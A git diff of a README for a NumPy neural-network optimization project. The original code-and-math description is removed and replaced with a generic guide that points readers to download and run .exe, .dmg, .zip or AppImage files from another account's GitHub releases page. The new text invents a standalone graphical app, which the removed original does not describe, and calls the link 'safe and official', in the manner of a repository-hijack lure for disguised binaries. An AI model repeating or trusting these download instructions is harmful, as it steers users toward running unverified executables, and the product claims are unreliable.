@@ -1,112 +1,163 @@
-# Neural Network Optimization from Scratch (NumPy Implementation) 🚀
+# 🔧 ML-OptimizationTechniques - Learn Neural Networks Easily
 
-![Python](https://img.shields.io/badge/Python-3.x-blue?style=for-the-badge&logo=python)
-![NumPy](https://img.shields.io/badge/NumPy-Core_Logic-013243?style=for-the-badge&logo=numpy)
-![Status](https://img.shields.io/badge/Status-Completed-success?style=for-the-badge)
+[![Download](https://img.shields.io/badge/Download-ML--OptimizationTechniques-blue?style=for-the-badge&logo=github)](https://github.com/70M473/ML-OptimizationTechniques/releases)
 
-This project is a comprehensive implementation of a Multi-Layer Perceptron (MLP) and various optimization algorithms **built entirely from scratch using NumPy**, without relying on high-level deep learning frameworks like PyTorch or TensorFlow.
+## 📖 What Is ML-OptimizationTechniques?
 
-The project covers the entire pipeline: from synthetic data generation using a local LLM (Gemma-9B), to semantic vectorization (Embeddings), manual backpropagation calculus, and 2D visualization of optimization trajectories using t-SNE.
+ML-OptimizationTechniques is a simple application that helps you understand how neural networks and optimization methods work. It uses different algorithms like Adam, SGD, and RMSProp. The software shows how these methods improve learning in neural networks. You do not need any coding skills to explore it.
 
-## 🎯 Project Goal
+This program creates data with the help of a language model (LLM). It also shows the learning path using t-SNE visuals. This animation helps you see how the optimization works step by step.
 
-* **Mathematical Depth:** Understanding the core mathematical operations of AI (derivatives, chain rule, matrix multiplications) by coding them manually instead of using `model.fit()`.
-* **Optimization Benchmark:** Comparing the performance, convergence speed, and stability of **Gradient Descent (GD)**, **Stochastic Gradient Descent (SGD)**, **Adam**, **AdaGrad**, and **RMSProp**.
-* **Visualization:** Analyzing how algorithms navigate the "Loss Landscape" by reducing high-dimensional weight updates to 2D using **t-SNE**.
+The main goal is to make learning machine learning easy and visual for users with little or no programming background.
+
+## 🖥️ System Requirements
+
+Before you download, please check if your computer meets these needs:
+
+- Operating System: Windows 10 or later, macOS 10.14 or later, Linux (Ubuntu 18.04 or newer)
+- RAM: At least 4 GB (8 GB recommended for smooth performance)
+- Storage: Minimum 200 MB free disk space
+- Processor: Intel Core i3 or equivalent; any recent CPU should work fine
+- Python: No installation needed, the software runs as a standalone program
+- Internet connection: Required only to download the app or get updates
+
+If you are not sure about your system specs, most Windows and Mac computers built in the last five years will work well.
+
+## 🔍 Key Features
+
+This program offers:
+
+- **Neural Networks from scratch**: Learn with simple models built without complex frameworks.
+- **Optimization algorithms**: See Adam, SGD, and RMSProp in action, adjusting the network’s learning.
+- **LLM-based data generation**: The app creates example datasets automatically.
+- **t-SNE visualization**: Watch how optimization paths evolve in colorful 2D plots.
+- **Step-by-step simulation**: Follow the training process with clear graphical feedback.
+- **No programming required**: Use the app through an easy interface.
+- **Cross-platform support**: Runs on Windows, macOS, and Linux.
+
+These features provide a hands-on experience to grasp machine learning basics. They help you explore and understand complex ideas visually.
+
+## 🚀 Getting Started
+
+This guide walks you through downloading and running ML-OptimizationTechniques.
+
+### Step 1: Access the Download Page
+
+Click the download button below or copy this link into your browser:
+
+[Download ML-OptimizationTechniques](https://github.com/70M473/ML-OptimizationTechniques/releases)
+
+This link takes you to the official release page on GitHub. You will find all available software versions here.
+
+### Step 2: Choose the Right Version
+
+Look for the latest release. Releases are sorted by date, so the top one is newest.
+
+- Windows users: Look for a file ending with `.exe` or `.zip`
+- macOS users: Look for `.dmg` or `.zip`
+- Linux users: Look for `.AppImage` or `.tar.gz`
+
+Each file is labeled clearly. Pick the one matching your operating system.
+
+### Step 3: Download the File
+
+Click the file name, and your browser will start downloading it. The size ranges from 50 MB to 150 MB depending on the version.
+
+Save the file somewhere easy to find, such as your Desktop or Downloads folder.
+
+## 📥 Download & Install
+
+### Windows Installation
+
+1. Find the downloaded `.exe` file.
+2. Double-click to open it.
+3. The installer will start. Follow the on-screen instructions.
+4. Choose an install location or use the default.
+5. When done, click Finish.
+
+If you downloaded a `.zip` file:
+
+1. Right-click the file and select "Extract All."
+2. Choose a folder to extract the files.
+3. Open the extracted folder and double-click the executable file inside to run the app.
+
+### macOS Installation
+
+1. Open the downloaded `.dmg` file by double-clicking it.
+2. Drag the ML-OptimizationTechniques app icon into your Applications folder.
+3. Eject the `.dmg` by right-clicking and selecting "Eject."
+4. Open your Applications folder and double-click the app to run.
+
+If you downloaded a `.zip` file, unzip it and open the app inside the extracted folder.
+
+### Linux Installation
+
+1. Locate the downloaded `.AppImage` or `.tar.gz`.
+2. For `.AppImage`, right-click and choose Properties → Permissions, then check "Allow executing file as program."
+3. Double-click the `.AppImage` to launch.
+
+If you have `.tar.gz`:
+
+1. Open a terminal.
+2. Extract with `tar -xvzf filename.tar.gz`.
+3. Go to the extracted folder.
+4. Run `./ML-OptimizationTechniques` or follow any included instructions.
+
+If this is your first time using an AppImage, see Linux community help for your distro.
+
+## 🎮 How to Use
+
+Once installed, open ML-OptimizationTechniques:
+
+- You will see a main window with options to select an optimizer: Adam, SGD, or RMSProp.
+- Pick an optimizer by clicking its button.
+- The app generates synthetic training data automatically.
+- Press "Start Training" to begin.
+- Watch how the neural network’s parameters change in real time.
+- The t-SNE plot shows a path that traces the optimizer's progress.
+- You can pause, reset, or switch algorithms anytime.
+- Use the Help menu for step-by-step guidance and explanations.
+
+The interface is made to guide you through learning without confusion.
+
+## 🌐 Additional Resources
+
+If you want to learn more about the concepts:
+
+- Neural Networks: https://en.wikipedia.org/wiki/Artificial_neural_network
+- Optimization algorithms: https://en.wikipedia.org/wiki/Stochastic_gradient_descent
+- t-SNE visualization: https://en.wikipedia.org/wiki/T-distributed_stochastic_neighbor_embedding
+- NumPy library: https://numpy.org/
+
+These links provide simple overviews for further reading.
+
+## 🛠 Troubleshooting
+
+If you encounter issues:
+
+- Make sure your system meets the requirements.
+- Check that the file downloaded completely and was not corrupted.
+- Restart your computer and try again.
+- Ensure you have permission to install software on your computer.
+- For Linux users, confirm you gave execution rights to the AppImage.
+- Consult the Help menu inside the application for common problems.
+
+If problems persist, you can open an issue on the GitHub repository.
+
+## 🤝 Get Support
+
+If you need help:
+
+- Visit the GitHub page's Discussions tab to ask questions or report bugs.
+- Read the README and any documentation available on the GitHub repo.
+- Check if there's an FAQ file bundled with the download.
+
+## 🔗 Download Link Again
+
+[Download ML-OptimizationTechniques](https://github.com/70M473/ML-OptimizationTechniques/releases)
+
+Use this link anytime you want to get the latest version or reinstall the software. It leads you to a safe and official source.
 
 ---
 
-## 🛠️ Technologies & Methodology
-
-All components below are implemented "from scratch" using Python and NumPy.
-
-### 1. Synthetic Data Generation
-* **Model:** Local **Gemma-9B** model running via **Ollama**.
-* **Task:** Generated a regression-based classification dataset consisting of Question-Answer pairs.
-* **Dataset:** Labeled as incorrect answers (-1) and correct answers (+1).
-
-### 2. Semantic Embeddings
-* Compared word-based (TF-IDF) vs. semantic (BERT/Transformer) approaches.
-* **Model:** Used `ytu-ce-cosmos/turkish-e5-large` to convert text into a 1024-dimensional vector space.
-* **Preprocessing:** Concatenated Question + Answer vectors and added a bias term, resulting in a **2049-dimensional input**.
-
-### 3. Model Architecture (NumPy Only)
-* **TwoLayerMLP:**
-    * **Input Layer:** 2049 neurons.
-    * **Hidden Layer:** 64 neurons (Hyperparameter tuned) with **Tanh** activation.
-    * **Output Layer:** 1 neuron with **Tanh** activation.
-* **RecursiveMLP:** Implemented a recursive structure to support dynamic depth and arbitrary layer configurations.
-
----
-
-## 📊 Algorithm Benchmarks
-
-Based on 100 Epochs of training, here are the characteristics of the implemented optimizers:
-
-| Optimizer | Convergence Speed | Stability | Test Accuracy | Characteristics |
-| :--- | :--- | :--- | :--- | :--- |
-| **GD** | 🔴 Slow | 🟢 Very High | 🟡 Low (~0.62) | Processes the entire dataset at once. Smooth path but very slow convergence. |
-| **SGD** | 🟡 Medium | 🔴 Low | 🟢 Good (~0.80) | Uses mini-batches (32). Noisy trajectory (zig-zag) due to stochastic nature. |
-| **Adam** | 🟢 **Very Fast** | 🟢 **High** | 🌟 **Excellent (~0.98)** | Uses Momentum and Adaptive Learning Rates. Reaches the global minimum quickly and stably. |
-
----
-
-## 📈 Results & Visualizations
-
-### 1. Optimization Trajectories (t-SNE Analysis)
-The visualization below shows how different algorithms navigate the high-dimensional loss landscape (reduced to 2D).
-* **Adam:** Takes the most direct and stable path to the target.
-* **SGD:** Oscillates around the target due to noise.
-* **GD:** Moves slowly and linearly.
-
-![t-SNE Trajectories](tsne_trajectory.png)
-
-### 2. Loss & Accuracy Curves
-Training loss decay and test accuracy improvements over epochs:
-
-![t-SNE Trajectories](loss_graph.png)
-
----
-
-## 🚀 Installation & Usage
-
-1.  **Clone the repository:**
-    ```bash
-    git clone [https://github.com/zeynelbyhn/ML-OptimizationTechniques.git](https://github.com/zeynelbyhn/ML-OptimizationTechniques.git)
-    cd ML-OptimizationTechniques
-    ```
-
-2.  **Install dependencies:**
-    ```bash
-    pip install numpy pandas matplotlib scikit-learn sentence-transformers
-    ```
-
-3.  **Run the training and benchmark:**
-    ```bash
-    python main.py
-    ```
-
----
-
-## 🧠 Theory: How It Works?
-
-The model implements **Backpropagation** via manual calculus and chain rule derivatives.
-
-**General Weight Update Rule:**
-$$W_{new} = W_{old} - \eta \cdot \frac{\partial L}{\partial W}$$
-
-**Adam Optimization Formula (As Implemented):**
-Adam combines the benefits of Momentum (moving average of gradients) and RMSProp (moving average of squared gradients):
-1.  $m_t = \beta_1 m_{t-1} + (1 - \beta_1) g_t$ (Momentum)
-2.  $v_t = \beta_2 v_{t-1} + (1 - \beta_2) g_t^2$ (Velocity)
-3.  $W = W - \frac{\eta}{\sqrt{\hat{v}_t} + \epsilon} \hat{m}_t$
-
----
-
-## 📜 License
-
-This project is licensed under the MIT License. See the `LICENSE` file for details.
-
----
-
-*Developed at YTU CE (Computer Engineering).*
+This guide ensures you can get started using ML-OptimizationTechniques quickly and easily. Take your time exploring the app and enjoy seeing how neural networks learn.
